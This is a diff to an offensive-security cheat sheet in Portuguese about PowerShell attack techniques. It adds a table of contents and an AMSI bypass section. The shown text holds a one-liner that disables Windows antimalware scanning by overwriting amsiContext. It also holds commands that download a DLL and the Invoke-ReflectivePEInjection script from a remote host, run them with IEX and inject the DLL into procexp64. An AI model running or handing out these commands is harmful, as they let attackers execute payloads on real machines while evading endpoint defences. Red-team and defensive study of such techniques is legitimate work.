@@ -1,3 +1,17 @@
+# Sumário
+
+- [Sumário](#sumário)
+- [Download arquivos via PowerShell](#download-arquivos-via-powershell)
+- [Execução de shellcode](#execução-de-shellcode)
+	- [Interagindo com API do Windows](#interagindo-com-api-do-windows)
+	- [Executando shellcode](#executando-shellcode)
+- [Link dinâmico com as DLL's carregadas no sistema](#link-dinâmico-com-as-dlls-carregadas-no-sistema)
+- [Injeção Reflexiva de DLL](#injeção-reflexiva-de-dll)
+	- [Script utilizado](#script-utilizado)
+	- [Utilização](#utilização)
+- [AMSI Bypass](#amsi-bypass)
+
+
 # Download arquivos via PowerShell
 
 ```powershell
@@ -171,4 +185,10 @@ $hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPoint
 $bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.1.16:1235/chucrutis.dll')
 IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.1.16:1235/Invoke-ReflectivePEInjection.ps1'))
 Invoke-ReflectivePEInjection -PEBytes $bytes -ProcName procexp64
+```
+
+# AMSI Bypass
+
+```powershell
+ $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
 ```
